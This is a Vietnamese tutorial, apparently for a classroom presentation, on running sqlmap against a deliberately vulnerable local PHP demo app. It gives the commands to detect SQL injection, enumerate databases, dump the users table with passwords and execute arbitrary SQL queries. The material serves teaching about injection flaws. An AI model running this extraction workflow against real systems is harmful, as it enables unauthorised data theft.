# Hướng Dẫn Sử Dụng sqlmap với Demo SQL Injection

## Yêu cầu

- sqlmap đã được cài đặt
- Docker containers đang chạy (ứng dụng demo đã sẵn sàng)
- Truy cập được http://localhost:8080

## Cài đặt sqlmap

### Trên Ubuntu/Debian:
```bash
sudo apt-get update
sudo apt-get install sqlmap
```

### Trên Windows:
- Tải từ: https://github.com/sqlmapproject/sqlmap
- Hoặc dùng: `pip install sqlmap`

### Kiểm tra cài đặt:
```bash
sqlmap --version
```

## Demo 1: Phát hiện lỗ hổng SQL Injection (Trang Search)

### Bước 1: Test cơ bản để phát hiện lỗ hổng

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" --batch
```

**Giải thích:**
- `-u`: URL cần test
- `--batch`: Tự động chọn "yes" cho tất cả câu hỏi (phù hợp cho demo)

**Kết quả mong đợi:**
- sqlmap sẽ phát hiện lỗ hổng SQL Injection
- Hiển thị thông tin về database (MySQL, version, etc.)

### Bước 2: Liệt kê tất cả databases

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" --dbs --batch
```

**Giải thích:**
- `--dbs`: Liệt kê tất cả databases trên server

**Kết quả mong đợi:**
- Hiển thị danh sách databases, bao gồm `sqli_demo`

### Bước 3: Liệt kê các bảng trong database sqli_demo

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo --tables --batch
```

**Giải thích:**
- `-D sqli_demo`: Chọn database sqli_demo
- `--tables`: Liệt kê các bảng trong database

**Kết quả mong đợi:**
- Hiển thị các bảng: `products`, `users`

### Bước 4: Xem cấu trúc bảng users

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo -T users --columns --batch
```

**Giải thích:**
- `-T users`: Chọn bảng users
- `--columns`: Liệt kê các cột trong bảng

**Kết quả mong đợi:**
- Hiển thị các cột: id, username, password, email, role, created_at

### Bước 5: Dump dữ liệu từ bảng users

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo -T users --dump --batch
```

**Giải thích:**
- `--dump`: Tải về toàn bộ dữ liệu từ bảng

**Kết quả mong đợi:**
- Hiển thị tất cả users với username, password, email, role

## Demo 2: Phát hiện lỗ hổng SQL Injection (Trang Login - POST)

### Bước 1: Test với POST request

```bash
sqlmap -u "http://localhost:8080/index.php" --data="username=test&password=test" --batch
```

**Giải thích:**
- `--data`: Dữ liệu POST cần gửi kèm

**Kết quả mong đợi:**
- sqlmap sẽ phát hiện lỗ hổng ở cả hai tham số username và password

### Bước 2: Chỉ định tham số cụ thể để test

```bash
sqlmap -u "http://localhost:8080/index.php" --data="username=test&password=test" -p username --batch
```

**Giải thích:**
- `-p username`: Chỉ test tham số username

### Bước 3: Dump dữ liệu

```bash
sqlmap -u "http://localhost:8080/index.php" --data="username=test&password=test" -D sqli_demo -T users --dump --batch
```

## Demo 3: Sử dụng file request (Nâng cao)

### Bước 1: Lưu request vào file

Tạo file `request.txt` với nội dung:
```
POST /index.php HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=test&password=test
```

### Bước 2: Sử dụng file request

```bash
sqlmap -r request.txt --batch
```

**Giải thích:**
- `-r`: Đọc request từ file
- sqlmap sẽ tự động phân tích và test tất cả tham số

## Các tùy chọn hữu ích khác

### Hiển thị payload được sử dụng:

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" --batch -v 3
```

**Giải thích:**
- `-v 3`: Verbose level 3, hiển thị chi tiết payload

### Chỉ test một kỹ thuật cụ thể:

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" --technique=U --batch
```

**Giải thích:**
- `--technique=U`: Chỉ dùng UNION-based SQL Injection
- Các kỹ thuật khác: B (Boolean-based), T (Time-based), E (Error-based)

### Thực thi câu SQL tùy ý:

```bash
sqlmap -u "http://localhost:8080/search.php?keyword=test" --sql-query="SELECT COUNT(*) FROM users" --batch
```

**Giải thích:**
- `--sql-query`: Thực thi câu SQL tùy ý

## Lưu ý khi demo

1. **Thời gian:** Mỗi lệnh sqlmap có thể mất 30 giây đến vài phút tùy vào độ phức tạp
2. **Output:** sqlmap sẽ hiển thị nhiều thông tin, cần giải thích từng phần
3. **Payload:** Có thể dùng `-v 3` để xem payload chi tiết
4. **Kết quả:** Nhấn mạnh rằng sqlmap đã tự động phát hiện và khai thác lỗ hổng mà không cần kiến thức sâu về SQL

## Script demo nhanh (cho thuyết trình)

```bash
# 1. Phát hiện lỗ hổng
sqlmap -u "http://localhost:8080/search.php?keyword=test" --batch

# 2. Liệt kê databases
sqlmap -u "http://localhost:8080/search.php?keyword=test" --dbs --batch

# 3. Dump bảng users
sqlmap -u "http://localhost:8080/search.php?keyword=test" -D sqli_demo -T users --dump --batch
```

## Troubleshooting

### Lỗi: "connection refused"
- Kiểm tra Docker containers đang chạy: `docker-compose ps`
- Kiểm tra ứng dụng truy cập được: `curl http://localhost:8080`

### sqlmap không phát hiện lỗ hổng
- Thử với `--level=3 --risk=2` để tăng độ nhạy
- Kiểm tra URL và tham số đúng chưa

### Lỗi encoding
- Thêm `--charset=UTF8` nếu có vấn đề với tiếng Việt

